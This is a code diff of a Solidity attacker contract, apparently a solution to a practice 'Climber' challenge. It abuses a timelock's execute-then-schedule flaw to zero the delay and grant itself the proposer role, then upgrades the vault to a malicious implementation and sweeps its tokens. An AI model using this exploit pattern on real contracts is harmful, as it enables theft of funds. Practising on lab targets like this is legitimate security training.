@@ -2,6 +2,7 @@
 
 import "./ClimberTimelock.sol";
 import "./ClimberVault.sol";
+import "./VaultAttacker.sol";
 import "hardhat/console.sol";
 
 pragma solidity ^0.8.0;
@@ -12,64 +13,94 @@ contract ClimberAttacker {
 
     address payable timeLock;
     address vault;
+    address token;
 
-    constructor (address _timeLock, address _vault) {
+    address[]  targets;
+    uint256[]  values;
+    bytes[]  dataElements;
+    bytes32 salt = bytes32("pwnd");
+
+    constructor (address _timeLock, address _vault, address _token) {
         owner = msg.sender;
         timeLock = payable(_timeLock);
         vault = _vault;
+        token = _token;
     }
 
     function attack() public {
-        bytes32 salt = bytes32("pwnd");
-
-        address[] memory targets = new address[](3);
-        uint256[] memory values = new uint256[](3);
-        bytes[] memory dataElements = new bytes[](3);
-
         //1: set delay to 0
-        targets[0] = timeLock;
-        values[0] = uint256(0);
-        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0); //set execution delay to 0
+        addOperation(
+            timeLock
+            , 0
+            , abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0)
+        );
 
         //2: set this contract as proposer
-        targets[1] = timeLock;
-        values[1] = uint256(0);
-        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, keccak256("PROPOSER_ROLE"), address(this)); //set this contract as admin
+        addOperation(
+            timeLock
+            , 0
+            , abi.encodeWithSelector(AccessControl.grantRole.selector, keccak256("PROPOSER_ROLE"), address(this))
+        );
 
         //3: now that I am a proposer, I can schedule the 2 previous actions in the timelock so that they can be executed
-        targets[2] = address(this);
-        values[2] = uint256(0);
-        dataElements[2] = abi.encodeWithSelector(this.schedule.selector); 
+        addOperation(
+            address(this)
+            , 0
+            , abi.encodeWithSelector(this.scheduleOperations.selector)
+        ); 
 
         //4: I send these actions for execution
-        ClimberTimelock(timeLock).execute(targets, values, dataElements, salt);
+        executeOperations();
 
-        
+        //5: now I deploy the bad vault and upgrade the vault implementation to the bad one
+        addOperation(
+            vault
+            , 0
+            , abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, address(new VaultAttacker()))
+        );
+
+        //6: I made the _setSweeper function public so that I can call it from here
+        addOperation(
+            vault
+            , 0
+            , abi.encodeWithSelector(VaultAttacker._setSweeper.selector, owner)
+        );
+
+        //7: I can now call the sweep function to steal the funds
+        addOperation(
+            vault
+            , 0
+            , abi.encodeWithSelector(VaultAttacker.sweepFunds.selector, token)
+        );
+
+        scheduleOperations();
+        executeOperations();
+
     }
 
-    function schedule() public {
-        bytes32 salt = bytes32("pwnd");
+    function addOperation(address target, uint256 value, bytes memory data) internal {
+        targets.push(target);
+        values.push(value);
+        dataElements.push(data);
+    }
 
-        address[] memory targets = new address[](3);
-        uint256[] memory values = new uint256[](3);
-        bytes[] memory dataElements = new bytes[](3);
+    function cleanOperations() internal {
+        delete targets;
+        delete values;
+        delete dataElements;
+    }
 
-        //1: set delay to 0
-        targets[0] = timeLock;
-        values[0] = uint256(0);
-        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0); //set execution delay to 0
+    function executeOperations() internal {
+        ClimberTimelock(timeLock).execute(targets, values, dataElements, salt);
+        //After executing the operations, we reset the arrays
+        cleanOperations();
+    }
 
-        //2: set this contract as proposer
-        targets[1] = timeLock;
-        values[1] = uint256(0);
-        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, keccak256("PROPOSER_ROLE"), address(this)); //set this contract as admin
-
-        targets[2] = address(this);
-        values[2] = uint256(0);
-        dataElements[2] = abi.encodeWithSelector(this.schedule.selector); 
-
-        //3: I send these actions for execution
+    function scheduleOperations() public {
+        console.log("ClimberAttacker.scheduleOperations: entered by %s", msg.sender);
         ClimberTimelock(timeLock).schedule(targets, values, dataElements, salt);
     }
+
+    
 
 }
